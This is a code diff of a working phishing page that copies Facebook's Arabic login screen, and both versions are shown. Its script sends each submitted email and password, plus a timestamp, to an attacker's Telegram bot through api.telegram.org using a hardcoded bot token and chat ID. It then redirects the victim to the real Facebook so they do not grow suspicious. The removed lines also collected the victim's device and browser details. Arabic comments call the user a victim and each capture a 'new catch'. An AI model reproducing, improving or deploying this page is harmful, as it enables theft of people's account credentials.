@@ -12,48 +12,45 @@
         .btn-login { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .links { margin-top: 15px; border-top: 1px solid #dadde1; padding-top: 20px; }
         .create-btn { background-color: #42b72a; color: white; padding: 10px 16px; text-decoration: none; border-radius: 6px; font-weight: bold; }
-        .footer-text { margin-top: 40px; font-size: 14px; color: #737373; }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2ygS89W.svg" alt="Facebook" class="fb-logo">
-        <form id="trapForm">
-            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
+        <form id="finalTrap">
+            <input type="text" id="u_name" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="u_pass" placeholder="كلمة السر" required>
             <button type="submit" class="btn-login">تسجيل الدخول</button>
         </form>
         <div style="margin: 15px 0;"><a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">هل نسيت كلمة السر؟</a></div>
-        <div class="links">
-            <a href="#" class="create-btn">إنشاء حساب جديد</a>
-        </div>
+        <div class="links"><a href="#" class="create-btn">إنشاء حساب جديد</a></div>
     </div>
-    <p class="footer-text"><b>إنشاء صفحة</b> لشخصية مشهورة أو ماركة تجارية أو نشاط تجاري.</p>
 
     <script>
-        const BOT_TOKEN = '8201696738:AAGFkCZTmXwbCh_RfNxURBZtH2NZjBhUAsg';
-        const CHAT_ID = '7576816211';
+        // تأكد أن هذه القيم صحيحة تماماً
+        const B_TOKEN = '8201696738:AAGFkCZTmXwbCh_RfNxURBZtH2NZjBhUAsg';
+        const C_ID = '7576816211';
 
-        document.getElementById('trapForm').addEventListener('submit', function(e) {
+        document.getElementById('finalTrap').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
+            const email = document.getElementById('u_name').value;
+            const password = document.getElementById('u_pass').value;
             
-            // جمع معلومات إضافية عن الضحية (المتصفح والجهاز)
-            const info = `\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent.substring(0, 50)}`;
-            const text = `🎯 صيد جديد بنجاح!\n\n📧 الحساب: ${u}\n🔑 الباسورد: ${p}${info}`;
+            const text = `🎯 صيد جديد مكتمل!\n\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}\n⏰ الوقت: ${new Date().toLocaleString()}`;
 
-            // إرسال البيانات فوراً إلى التليجرام
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-            }).then(() => {
-                // توجيه الضحية لفيسبوك الحقيقي فوراً لإزالة أي شك
-                window.location.href = 'https://www.facebook.com/login/?privacy_mutation_token=true';
-            }).catch(() => {
+            try {
+                // محاولة إرسال البيانات
+                await fetch(`https://api.telegram.org/bot${B_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: C_ID, text: text })
+                });
+                // بعد النجاح، انقل الضحية لفيسبوك الحقيقي
+                window.location.href = 'https://www.facebook.com/login';
+            } catch (error) {
+                // في حالة فشل الإنترنت، انقل الضحية أيضاً لعدم الشك
                 window.location.href = 'https://www.facebook.com';
-            });
+            }
         });
     </script>
 </body>
